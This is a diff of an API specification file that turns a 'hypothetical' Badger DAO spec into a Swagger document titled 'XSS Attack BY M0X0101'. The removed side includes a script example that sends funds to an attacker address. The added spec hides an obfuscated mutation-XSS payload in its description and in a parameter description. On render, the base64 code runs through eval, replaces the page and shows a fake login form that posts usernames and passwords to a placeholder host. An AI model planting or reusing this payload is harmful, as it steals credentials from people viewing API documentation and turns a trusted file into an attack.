@@ -1,45 +1,38 @@
-openapi: 3.0.0
+swagger: '2.0'
 info:
-  title:  Badger DAO Hypothetical API 
-  version: 1.0.0
+  title: XSS Attack BY M0X0101
   description: |
-    This is a hypothetical API specification for Badger DAO, designed to demonstrate a vulnerability
-    where YAML or HTML injection could affect smart contract interactions. The endpoint defined below
-    could be introduced via YAML injection into the API documentation or implementation, leading to
-    security issues exploitable through the Web3 interface.
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IHZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTthLmFjdGlvbj0iaHR0cDovL0lQOlBPUlQiO2EubWV0aG9kPSdQT1NUJzthLmlubmVySFRNTD0nPGNlbnRlcj5Vc2VybmFtZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVzZXJOYW1lIj48YnI+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icHdkIj48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj48L2NlbnRlcj4nOyBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw==' onerror='eval(atob(this.id))'>"></form>
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
 paths:
-  /setMessage:
-    post:
-      summary: Set a message stored on-chain and displayed in the Web3 interface
-      description: |
-        This endpoint allows anyone to set a message that is stored in a Badger DAO smart contract
-        and displayed in the Web3 interface without sanitization. By injecting HTML (e.g., malicious
-        JavaScript), an attacker could manipulate the user's browser to alter transaction parameters
-        or trick users into approving unauthorized fund transfers, leading to theft of user funds.
-        Since this impacts the Web3 smart contract interface, it falls within the Badger DAO bug
-        bounty scope on Immunefi, which includes loss of user funds as a critical impact.
-      requestBody:
-        required: true
-        content:
-          application/json:
-            schema:
-              type: object
-              properties:
-                message:
-                  type: string
-                  description: Message to be stored on-chain and displayed. Accepts unsanitized HTML/JavaScript.
-                  example: "<script>window.ethereum.send({method: 'eth_sendTransaction', params: [{to: '0xAttackerAddress', value: '1000000000000000000'}]})</script>"
+  /M0X0101:
+    get:
       responses:
         '200':
-          description: Message set successfully
-          content:
-            application/json:
-              schema:
-                type: object
-                properties:
-                  status:
-                    type: string
-                    example: "success"
-                  message:
-                    type: string
-                    example: "Message stored on-chain"
+          description: No response was specified
+      tags:
+        - M0X0101_XSS_D
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/hack/hachid/{id}':
+    delete:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IHZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTthLmFjdGlvbj0iaHR0cDovL0lQOlBPUlQiO2EubWV0aG9kPSdQT1NUJzthLmlubmVySFRNTD0nPGNlbnRlcj5Vc2VybmFtZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVzZXJOYW1lIj48YnI+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icHdkIj48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj48L2NlbnRlcj4nOyBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw==' onerror='eval(atob(this.id))'>"></form>
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
